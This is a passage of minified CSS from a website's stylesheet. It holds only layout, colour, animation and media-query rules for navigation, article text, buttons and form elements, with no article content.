1280px){.css-ca69m1{-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;}.css-ca69m1.shrunk{height:60px;}}.css-s7eam4{width:100%;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;}.css-s7eam4.shrunk{background-color:#FFF;}@media screen and (min-width: 1280px){.css-s7eam4{width:80px;}.css-s7eam4.isShrunk{width:60px;}}.css-1yp618h{height:100%;padding:0 20px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;cursor:pointer;}@media screen and (min-width: 1280px){.css-1yp618h{display:none;}}.css-uubvgk{width:100%;position:absolute;top:100%;right:0;overflow:auto;}@media screen and (max-width: 1279px){.css-uubvgk.disable-pointer-events{overflow:hidden;pointer-events:none;}}@media screen and (min-width: 1280px){.css-uubvgk{width:inherit;height:100%;position:relative;top:unset;overflow:visible;}}.css-qv0uab{width:100%;height:initial;padding:0 20px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:start;-ms-flex-pack:start;-webkit-justify-content:flex-start;justify-content:flex-start;-webkit-align-items:flex-end;-webkit-box-align:flex-end;-ms-flex-align:flex-end;align-items:flex-end;position:relative;}@media screen and (min-width: 1280px){.css-qv0uab{height:100%;padding:0;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}}.css-1vihqh6{width:100%;height:100%;margin:0;padding:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;opacity:0;-webkit-transition:opacity 0.17s;transition:opacity 0.17s;}.css-1vihqh6.show{opacity:1;}@media screen and (min-width: 1280px){.css-1vihqh6{height:100%;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;opacity:1;}}.css-xx1j5w{width:100%;height:100%;background-color:#F5F2E9;opacity:0;position:fixed;top:0;left:0;z-index:-1;-webkit-transition:opacity 0.3s;transition:opacity 0.3s;}.css-xx1j5w.show{opacity:1;}@media screen and (min-width: 1280px){.css-xx1j5w{display:none;}}.css-w9vsuy{width:-webkit-min-content;width:-moz-min-content;width:min-content;margin-top:40px;display:grid;grid-template-columns:repeat(2, 1fr);}@media screen and (min-width: 768px){.css-w9vsuy{width:600px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;}}@media screen and (min-width: 1280px){.css-w9vsuy{margin:0;}}.css-sn55je{min-height:50px;width:-webkit-max-content;width:-moz-max-content;width:max-content;height:100%;padding:0 0 50px 0;}@media screen and (max-width: 767px){.css-sn55je{min-width:120px;}}.css-cyopkh{position:relative;cursor:pointer;}.css-cyopkh h6{margin:0;font-size:14px;font-weight:bold;color:#4C433F;}.css-cyopkh.disabled{cursor:unset;pointer-events:none;}.css-1lt8ec3{margin-top:10px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;}@media screen and (min-width: 768px){.css-1lt8ec3{margin-top:20px;}}.css-1goxo4s{width:-webkit-min-content;width:-moz-min-content;width:min-content;white-space:nowrap;line-height:30px;font-size:12px;color:#908883;position:relative;cursor:pointer;}.css-1goxo4s:after{content:'';width:0;border-bottom:1px solid #908883;position:absolute;right:0;bottom:15%;-webkit-transition:width 0.4s cubic-bezier(0.215, 0.61, 0.355, 1) 0s;transition:width 0.4s cubic-bezier(0.215, 0.61, 0.355, 1) 0s;}.css-1goxo4s:hover:after{width:100%;left:0;}.css-sfpfes{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;height:80px;margin-left:30px;}@media screen and (min-width: 768px){.css-sfpfes{margin-left:70px;}}.css-1kwq295{margin:0 12px;}.css-1kwq295:hover svg path{fill:rgb(200, 189, 184);}.css-1kwq295:active svg path{fill:rgb(144, 136, 131);}@media screen and (min-width: 1280px){.css-1kwq295{margin:0;margin-right:30px;height:100%;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}}.css-1d9e2gf{width:100%;font-size:10px;color:#4C433F;position:relative;}.css-2itsev{padding:30px 20px 0 20px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;}.css-2itsev .logo{cursor:pointer;}@media screen and (min-width: 768px){.css-2itsev{padding:30px 40px 0 40px;}}@media screen and (min-width: 1280px){.css-2itsev{padding:40px 40px 0 40px;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;}}.css-1shon4x{padding:0 20px;}.css-1shon4x hr{height:1px;border:none;background-color:#D3CEC7;}.css-13gtdbe{padding:30px 20px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;}@media screen and (min-width: 768px){.css-13gtdbe{padding:30px 20px 30px 40px;}}@media screen and (min-width: 1024px){.css-13gtdbe{padding:30px 40px;}}.css-fk0xdk{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;}.css-fk0xdk .right-policy-item{padding:0 0 20px 0;cursor:pointer;}.css-fk0xdk .right-policy-item:last-child{padding:0;}.css-fk0xdk .right-policy-item.disabled{cursor:initial;}.css-fk0xdk .right-policy-item.invisible{display:none;}@media screen and (min-width: 1024px){.css-fk0xdk{-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}.css-fk0xdk .right-policy-item{padding:0 20px 0 0;}.css-fk0xdk .right-policy-item:last-child{padding:0 20px 0 0;}.css-fk0xdk .right-policy-item.disabled{-webkit-order:-1;-ms-flex-order:-1;order:-1;}}.css-1jw0r0q{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;}@media screen and (min-width: 768px){.css-1jw0r0q{-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;}}.css-zsv9kv{margin:0 5px;color:#C71532;}.css-1na388z{height:100vh;overflow-y:scroll;overflow-x:hidden;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;}.css-1blv94u{width:375px;position:relative;overflow:auto;}@media screen and (min-width: 375px){.css-1blv94u{width:100%;}}.css-jf1sy{font-size:16px;min-height:16px;color:#C71532;visibility:hidden;}.css-jf1sy.show{visibility:visible;}.css-cssveg{position:relative;}@-webkit-keyframes animation-13vfu4w{0%{-webkit-transform:translateY(-50px);-moz-transform:translateY(-50px);-ms-transform:translateY(-50px);transform:translateY(-50px);opacity:0;}100%{-webkit-transform:translateY(0);-moz-transform:translateY(0);-ms-transform:translateY(0);transform:translateY(0);opacity:1;}}@keyframes animation-13vfu4w{0%{-webkit-transform:translateY(-50px);-moz-transform:translateY(-50px);-ms-transform:translateY(-50px);transform:translateY(-50px);opacity:0;}100%{-webkit-transform:translateY(0);-moz-transform:translateY(0);-ms-transform:translateY(0);transform:translateY(0);opacity:1;}}@-webkit-keyframes animation-153ic13{0%{-webkit-clip-path:polygon(0% 0%, 0% 100%, 0% 100%, 0% 0%);clip-path:polygon(0% 0%, 0% 100%, 0% 100%, 0% 0%);}100%{-webkit-clip-path:polygon(0% 0%, 0% 100%, 100% 100%, 100% 0%);clip-path:polygon(0% 0%, 0% 100%, 100% 100%, 100% 0%);}}@keyframes animation-153ic13{0%{-webkit-clip-path:polygon(0% 0%, 0% 100%, 0% 100%, 0% 0%);clip-path:polygon(0% 0%, 0% 100%, 0% 100%, 0% 0%);}100%{-webkit-clip-path:polygon(0% 0%, 0% 100%, 100% 100%, 100% 0%);clip-path:polygon(0% 0%, 0% 100%, 100% 100%, 100% 0%);}}.css-1h5x3dy{cursor:pointer;}.css-8sr13a{line-height:1.5;color:#4C433F;}.css-8sr13a h1{margin-top:1em;font-size:30px;}.css-8sr13a h2{margin-top:1em;font-size:28px;}.css-8sr13a h3{margin-top:1em;font-size:24px;}.css-8sr13a h4{margin-top:1em;font-size:22px;}.css-8sr13a h5{margin-top:1em;font-size:20px;}.css-8sr13a h6{margin-top:1em;font-size:16px;}.css-8sr13a .paragraph{margin-block-start:1em;margin-block-end:1em;-webkit-margin-start:0px;margin-inline-start:0px;-webkit-margin-end:0px;margin-inline-end:0px;font-size:16px;}.css-8sr13a .paragraph +.paragraph{margin-top:1em;}.css-8sr13a .paragraph code{word-break:break-all;}.css-8sr13a .paragraph strong{font-weight:600;}.css-8sr13a .paragraph em{font-style:oblique;color:#232325;}.css-8sr13a ul{list-style:none;font-size:16px;margin:0;padding:0;}.css-8sr13a ul li{margin:1em 0;overflow-wrap:break-word;padding-left:calc(10px + 1em);position:relative;}.css-8sr13a ul li::before{-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;color:#d83751;content:'â¢';font-family:initial;left:0;position:absolute;top:0;width:1em;}.css-8sr13a img{display:block;margin-bottom:10px;margin-left:auto;margin-right:auto;margin-top:20px;max-width:100%;}.css-8sr13a img+em{color:#908883;display:block;font-size:14px;line-height:18px;margin:0 auto;text-align:center;}.css-8sr13a ol{margin:0;padding-left:0;font-size:16px;margin-top:12px;list-style:none;margin-bottom:12px;list-style-position:inside;counter-reset:ol-counter;}.css-8sr13a ul li::marker{color:red;}.css-8sr13a blockquote{border-left:6px solid #d83751;margin:0;}.css-8sr13a blockquote >.paragraph{padding:12px 19px;}.css-8sr13a ol li{padding-left:calc(10px + 1em);display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;margin-bottom:12px;}.css-8sr13a ol li:last-child{margin:0;}.css-8sr13a ol li::before{padding-right:10px;counter-increment:ol-counter;content:counter(ol-counter) '.';}.css-8sr13a ol li >div{overflow:auto;}.css-8sr13a ol li >div >.paragraph{margin:0;margin-bottom:12px;}.css-8sr13a ol li >div >.paragraph:last-child{margin:0;}.css-8sr13a pre{background-color:#f5f5f5;border:1px solid #e3e3e3;border-radius:4px;overflow:auto;padding:10px 20px;}.css-8sr13a code{background-color:#f5f5f5;border:1px solid #e3e3e3;border-radius:4px;font-size:12px;line-height:14px;padding:2px;}.css-8sr13a pre code{border:0;padding:0;}.css-8sr13a a{color:#d83751;-webkit-text-decoration:underline;text-decoration:underline;}@media screen and (max-width: 767px){.css-8sr13a h1{font-size:26px;}.css-8sr13a h2{font-size:24px;}.css-8sr13a h3{font-size:22px;}.css-8sr13a h4{font-size:20px;}.css-8sr13a h5{font-size:18px;}.css-8sr13a h6{font-size:16px;}}.css-8sr13a .table-wrapper{overflow:auto;}.css-8sr13a .table-wrapper table{width:100%;margin:auto;border-spacing:0;border-collapse:collapse;}.css-8sr13a .table-wrapper table th{white-space:nowrap;}.css-8sr13a .table-wrapper table th,.css-8sr13a .table-wrapper td{padding:6px 13px;border:1px solid #ddd;margin:0;-webkit-text-size-adjust:100%;-moz-text-size-adjust:100%;-ms-text-size-adjust:100%;text-size-adjust:100%;}.css-8sr13a .table-wrapper table tr:nth-child(2n){background-color:#f8f8f8;}.css-8sr13a .table-wrapper+.paragraph em{color:#908883;display:block;font-size:14px;line-height:18px;margin:0 auto;text-align:center;}.css-d8p5rg{display:none;}.css-d8p5rg.dark{fill:#4C433F;}.css-d8p5rg.light{fill:#FFF;}@media screen and (min-width: 1280px){.css-d8p5rg{margin:0 0 0 5px;fill:#4C433F;-webkit-transition:fill 0.3s;transition:fill 0.3s;}}.css-d8p5rg.active{display:block;}@media screen and (min-width: 1280px){.css-d8p5rg.active{display:none;}}.css-1g3s13r{display:block;}.css-1g3s13r.dark{fill:#4C433F;}.css-1g3s13r.light{fill:#FFF;}@media screen and (min-width: 1280px){.css-1g3s13r{margin:0 0 0 5px;fill:#4C433F;-webkit-transition:fill 0.3s;transition:fill 0.3s;}}.css-1g3s13r.active{display:none;}@media screen and (min-width: 1280px){.css-1g3s13r.active{display:block;}}.css-1fv32bs{width:100%;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:end;-ms-flex-pack:end;-webkit-justify-content:flex-end;justify-content:flex-end;transform-origin:top center;height:0;-webkit-transform:scaleY(0);-moz-transform:scaleY(0);-ms-transform:scaleY(0);transform:scaleY(0);-webkit-transition:height 0.3s,opacity 0.3s,-webkit-transform 0.3s;transition:height 0.3s,opacity 0.3s,transform 0.3s;}.css-1fv32bs.active{opacity:1;-webkit-transform:scaleY(1);-moz-transform:scaleY(1);-ms-transform:scaleY(1);transform:scaleY(1);}@media screen and (min-width: 1280px){.css-1fv32bs{padding:30px 40px;background-color:#ECE8E0;opacity:0;}}@media screen and (max-width: 1279px){.css-1fv32bs.active{height:100px;}}@media screen and (min-width: 1280px){.css-1fv32bs{height:140px;}}.css-142ads6{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;transform-origin:center;}.css-142ads6.left{-webkit-transform:rotate(0deg);-moz-transform:rotate(0deg);-ms-transform:rotate(0deg);transform:rotate(0deg);}.css-142ads6.right{-webkit-transform:rotate(180deg);-moz-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg);}.css-142ads6 path{fill:#4C433F;}.css-1990h1p{width:100%;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:end;-ms-flex-pack:end;-webkit-justify-content:flex-end;justify-content:flex-end;transform-origin:top center;height:0;-webkit-transform:scaleY(0);-moz-transform:scaleY(0);-ms-transform:scaleY(0);transform:scaleY(0);-webkit-transition:height 0.3s,opacity 0.3s,-webkit-transform 0.3s;transition:height 0.3s,opacity 0.3s,transform 0.3s;}.css-1990h1p.active{opacity:1;-webkit-transform:scaleY(1);-moz-transform:scaleY(1);-ms-transform:scaleY(1);transform:scaleY(1);}@media screen and (min-width: 1280px){.css-1990h1p{padding:30px 40px;background-color:#ECE8E0;opacity:0;}}@media screen and (max-width: 1279px){.css-1990h1p.active{height:400px;}}@media screen and (min-width: 1280px){.css-1990h1p{height:260px;}}.css-1nf81nc{display:inline-block;width:120px;height:80px;-webkit-transform:scale(1);-moz-transform:scale(1);-ms-transform:scale(1);transform:scale(1);overflow:hidden;background-color:#C71532;}.css-1nf81nc img{width:100%;height:100%;-webkit-transition:-webkit-transform 1s cubic-bezier(0.165, 0.84, 0.44, 1);transition:transform 1s cubic-bezier(0.165, 0.84, 0.44, 1);}.css-ric4bx{display:inline-block;width:120px;height:80px;-webkit-transform:scale(1);-moz-transform:scale(1);-ms-transform:scale(1);transform:scale(1);overflow:hidden;background-color:#F5AB1A;}.css-ric4bx img{width:100%;height:100%;-webkit-transition:-webkit-transform 1s cubic-bezier(0.165, 0.84, 0.44, 1);transition:transform 1s cubic-bezier(0.165, 0.84, 0.44, 1);}.css-hwlzfs{width:100%;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:end;-ms-flex-pack:end;-webkit-justify-content:flex-end;justify-content:flex-end;transform-origin:top center;height:0;-webkit-transform:scaleY(0);-moz-transform:scaleY(0);-ms-transform:scaleY(0);transform:scaleY(0);-webkit-transition:height 0.3s,opacity 0.3s,-webkit-transform 0.3s;transition:height 0.3s,opacity 0.3s,transform 0.3s;}.css-hwlzfs.active{opacity:1;-webkit-transform:scaleY(1);-moz-transform:scaleY(1);-ms-transform:scaleY(1);transform:scaleY(1);}@media screen and (min-width: 1280px){.css-hwlzfs{padding:30px 40px;background-color:#ECE8E0;opacity:0;}}@media screen and (max-width: 1279px){.css-hwlzfs.active{height:200px;}}@media screen and (min-width: 1280px){.css-hwlzfs{height:140px;}}.css-9e4kxr{position:relative;cursor:pointer;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;padding:40px;}.css-9e4kxr h6{margin:0;font-size:14px;font-weight:bold;color:#4C433F;}.css-9e4kxr.disabled{cursor:unset;pointer-events:none;}@media screen and (min-width: 768px){.css-9e4kxr{-webkit-box-pack:start;-ms-flex-pack:start;-webkit-justify-content:flex-start;justify-content:flex-start;}}@media screen and (min-width: 1280px){.css-9e4kxr{-webkit-box-pack:end;-ms-flex-pack:end;-webkit-justify-content:flex-end;justify-content:flex-end;}}.css-9e4kxr h6{margin:0 16px 0 0;}.css-wpfswj{margin-right:20px;position:absolute;top:-42px;right:0;z-index:2;}.css-wpfswj svg{width:84px;height:84px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:pointer;}@media screen and (min-width: 1024px){.css-wpfswj{margin-right:30px;}}.css-19e4vf0{position:absolute;bottom:0;left:0;right:0;color:#000;z-index:2;height:100px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;background-color:rgba(200, 189, 184, 0.8);display:none;}.css-yp163g{width:240px;height:60px;margin:0;border-radius:2px;font-size:14px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;position:relative;cursor:pointer;overflow:hidden;color:#4C433F;border:solid 1px #4C433F;background-color:transparent;width:100px;height:30px;margin:0 10px;}.css-yp163g .slide{width:100%;height:100%;background-color:#4C433F;position:absolute;z-index:0;-webkit-transform:translateX(-100%);-moz-transform:translateX(-100%);-ms-transform:translateX(-100%);transform:translateX(-100%);-webkit-transition:-webkit-transform 0.25s;transition:transform 0.25s;}.css-yp163g .content{z-index:1;}.css-yp163g:hover{-webkit-transition:color 0.2s;transition:color 0.2s;color:#FFF;}.css-yp163g:hover .slide{-webkit-transform:translateX(0);-moz-transform:translateX(0);-ms-transform:translateX(0);transform:translateX(0);}.css-yp163g:active{background-color:#908883;color:#FFF;}.css-yp163g:active .slide{opacity:0;}@-webkit-keyframes animation-skxmla{from{-webkit-transform:rotate(0deg);-moz-transform:rotate(0deg);-ms-transform:rotate(0deg);transform:rotate(0deg);}to{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);}}@keyframes animation-skxmla{from{-webkit-transform:rotate(0deg);-moz-transform:rotate(0deg);-ms-transform:rotate(0deg);transform:rotate(0deg);}to{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);}}@-webkit-keyframes animation-jm310z{from{stroke-dashoffset:150;-webkit-transform:rotate(-110deg) scaleY(1);-moz-transform:rotate(-110deg) scaleY(1);-ms-transform:rotate(-110deg) scaleY(1);transform:rotate(-110deg) scaleY(1);}50%{stroke-dashoffset:29.5;-webkit-transform:rotate(-38.5deg) scaleY(1);-moz-transform:rotate(-38.5deg) scaleY(1);-ms-transform:rotate(-38.5deg) scaleY(1);transform:rotate(-38.5deg) scaleY(1);}50.005%{-webkit-transform:rotate(-90deg) scaleY(-1);-moz-transform:rotate(-90deg) scaleY(-1);-ms-transform:rotate(-90deg) scaleY(-1);transform:rotate(-90deg) scaleY(-1);}to{stroke-dashoffset:150;-webkit-transform:rotate(-65deg) scaleY(-1);-moz-transform:rotate(-65deg) scaleY(-1);-ms-transform:rotate(-65deg) scaleY(-1);transform:rotate(-65deg) scaleY(-1);}}@keyframes animation-jm310z{from{stroke-dashoffset:150;-webkit-transform:rotate(-110deg) scaleY(1);-moz-transform:rotate(-110deg) scaleY(1);-ms-transform:rotate(-110deg) scaleY(1);transform:rotate(-110deg) scaleY(1);}50%{stroke-dashoffset:29.5;-webkit-transform:rotate(-38.5deg) scaleY(1);-moz-transform:rotate(-38.5deg) scaleY(1);-ms-transform:rotate(-38.5deg) scaleY(1);transform:rotate(-38.5deg) scaleY(1);}50.005%{-webkit-transform:rotate(-90deg) scaleY(-1);-moz-transform:rotate(-90deg) scaleY(-1);-ms-transform:rotate(-90deg) scaleY(-1);transform:rotate(-90deg) scaleY(-1);}to{stroke-dashoffset:150;-webkit-transform:rotate(-65deg) scaleY(-1);-moz-transform:rotate(-65deg) scaleY(-1);-ms-transform:rotate(-65deg) scaleY(-1);transform:rotate(-65deg) scaleY(-1);}}.css-1sjdpqx{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;width:100%;max-width:300px;min-height:250px;margin:0 auto;}.css-1sjdpqx h3{margin-top:50px;text-align:center;font-size:18px;color:#4C433F;}@media (min-width: 768px){.css-1sjdpqx{max-width:550px;}}@media (min-width: 1024px){.css-1sjdpqx{padding:0;max-width:100%;}.css-1sjdpqx h3{margin-top:0;font-size:24px;}}.css-1nevcxy{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}@media (min-width: 768px){.css-1nevcxy{-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;}}.css-1uwy6if{position:relative;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;margin-bottom:26px;}@media (min-width: 768px){.css-1uwy6if{margin:0 10px;}}.css-1uwy6if .show{position:absolute;bottom:-25px;left:0;}.css-cd9ufl{min-height:16px;margin:10px 0;font-size:16px;color:#c71532;}.css-gb53pj{margin:0 0 30px;text-align:center;font-size:10px;}.css-10t5c7o{border:1px solid #908883;border-radius:2px;padding:20px 20px;height:60px;box-sizing:border-box;width:100%;font-size:16px;color:#4C433F;width:300px;margin:0;}.css-10t5c7o::-webkit-input-placeholder{color:#C8BDB8;}.css-10t5c7o::-moz-placeholder{color:#C8BDB8;}.css-10t5c7o:-ms-input-placeholder{color:#C8BDB8;}.css-10t5c7o::placeholder{color:#C8BDB8;}.css-10t5c7o:focus{border:2px solid #4C433F;outline:none;}.css-10t5c7o.error{border-color:#C71532;}.css-ijwcic{width:240px;height:60px;margin:0;border-radius:2px;font-size:14px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;position:relative;cursor:pointer;overflow:hidden;color:#4C433F;border:solid 1px #4C433F;background-color:transparent;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-transition:background-color 0.5s;transition:background-color 0.5s;width:300px;}.css-ijwcic:hover{-webkit-transition:color 0.2s;transition:color 0.2s;}.css-ijwcic.LOADING{background-color:#4C433F;border:none;cursor:not-allowed;}.css-ijwcic.LOADING svg{stroke-dasharray:170;stroke-dashoffset:170;}.css-ijwcic.LOADING svg .circle-group{transform-origin:center center;-webkit-animation:animation-skxmla 7s linear infinite;animation:animation-skxmla 7s linear infinite;}.css-ijwcic.LOADING svg circle{fill:none;stroke-width:7.83px;transform-origin:center center;-webkit-transform:rotate(0deg);-moz-transform:rotate(0deg);-ms-transform:rotate(0deg);transform:rotate(0deg);}.css-ijwcic.LOADING svg circle.progress{stroke:#F5F2E9;stroke-dashoffset:130;-webkit-animation:animation-jm310z 4.5s ease infinite;animation:animation-jm310z 4.5s ease infinite;}.css-ijwcic.LOADING svg{-webkit-transform:scale(0.6, 0.6);-moz-transform:scale(0.6, 0.6);-ms-transform:scale(0.6, 0.6);transform:scale(0.6, 0.6);}.css-ijwcic.SUCCESS{background-color:#64CDA2;border:none;cursor:initial;}.css-ijwcic.SUCCESS img{width:36px;height:36px;}.css-ijwcic.FAIL{background-color:#C71532;border:none;}.css-ijwcic.FAIL img{width:36px;height:36px;}@media (min-width: 768px){.css-ijwcic{width:240px;}}@-webkit-keyframes animation-eiy7tu{0%{-webkit-transform:translateY(0);-moz-transform:translateY(0);-ms-transform:translateY(0);transform:translateY(0);}50%{-webkit-transform:translateY(-15px);-moz-transform:translateY(-15px);-ms-transform:translateY(-15px);transform:translateY(-15px);}100%{-webkit-transform:translateY(0);-moz-transform:translateY(0);-ms-transform:translateY(0);transform:translateY(0);}}@keyframes animation-eiy7tu{0%{-webkit-transform:translateY(0);-moz-transform:translateY(0);-ms-transform:translateY(0);transform:translateY(0);}50%{-webkit-transform:translateY(-15px);-moz-transform:translateY(-15px);-ms-transform:translateY(-15px);transform:translateY(-15px);}100%{-webkit-transform:translateY(0);-moz-transform:translateY(0);-ms-transform:translateY(0);transform:translateY(0);}}@-webkit-keyframes animation-ox4vyo{0%{opacity:0;}100%{opacity:1;}}@keyframes animation-ox4vyo{0%{opacity:0;}100%{opacity:1;}}.css-v7iset{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;margin-left:8px;padding:9px 20px;border-radius:60px;font-weight:900;font-size:12px;color:white;background-color:#4C433F;border:1px solid #a09a94;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;}.css-v7iset.hide{display:none;}.css-v7iset:hover{background-color:#FFF;border-color:#faf8f4;color:#4C433F;-webkit-transition:all 0.3s;transition:all 0.3s;}.css-v7iset:active{background-color:#908883;border-color:#c2bcb6;}.css-v7iset:focus{outline:none;}.css-1ipix51{position:relative;overflow:hidden;}.css-1sf8wwi{position:absolute;-webkit-background-size:cover;background-size:cover;-webkit-background-position:center;background-position:center;width:100%;height:100%;-webkit-transform:scale(1);-moz-transform:scale(1);-ms-transform:scale(1);transform:scale(1);-webkit-transition:-webkit-transform 1s cubic-bezier(0.165, 0.84, 0.44, 1);transition:transform 1s cubic-bezier(0.165, 0.84, 0.44, 1);}.css-1sf8wwi:hover{-webkit-transform:scale(1.2);-moz-transform:scale(1.2);-ms-transform:scale(1.2);transform:scale(1.2);}.css-1sf8wwi::after{content:'';background:#000;position:absolute;left:0;top:0;z-index:2;width:100%;height:100%;opacity:0.45;}.css-1sf8wwi.hide{display:none;}.css-11u74fh{width:100%;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;position:relative;}@media screen and (min-width: 768px){.css-11u74fh{position:static;}}.css-qdphv9{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;position:absolute;bottom:calc(32px + 10px);right:0;}@media screen and (min-width: 768px){.css-qdphv9{position:static;}}.css-73ect7{position:relative;z-index:1;width:335px;margin:0 auto;}@media screen and (min-width: 768px){.css-73ect7{width:620px;}}@media screen and (min-width: 1024px){.css-73ect7{width:760px;}}.css-73ect7.bgBottom{padding-bottom:85px;}@media screen and (min-width: 768px){.css-73ect7.bgBottom{padding-bottom:122px;}}.css-edbnnu{position:relative;}.css-edbnnu:after{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:white;z-index:0;}@media screen and (min-width: 768px){.css-edbnnu:after{left:35px;}}.css-1xbxfgz{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;padding:20px 0;}@media screen and (min-width: 768px){.css-1xbxfgz{-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;}}.css-glrwwq{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;margin-bottom:20px;font-size:16px;color:#4C433F;}@media screen and (min-width: 768px){.css-glrwwq{margin-bottom:0;}}.css-glrwwq.hide{display:none;}@media screen and (min-width: 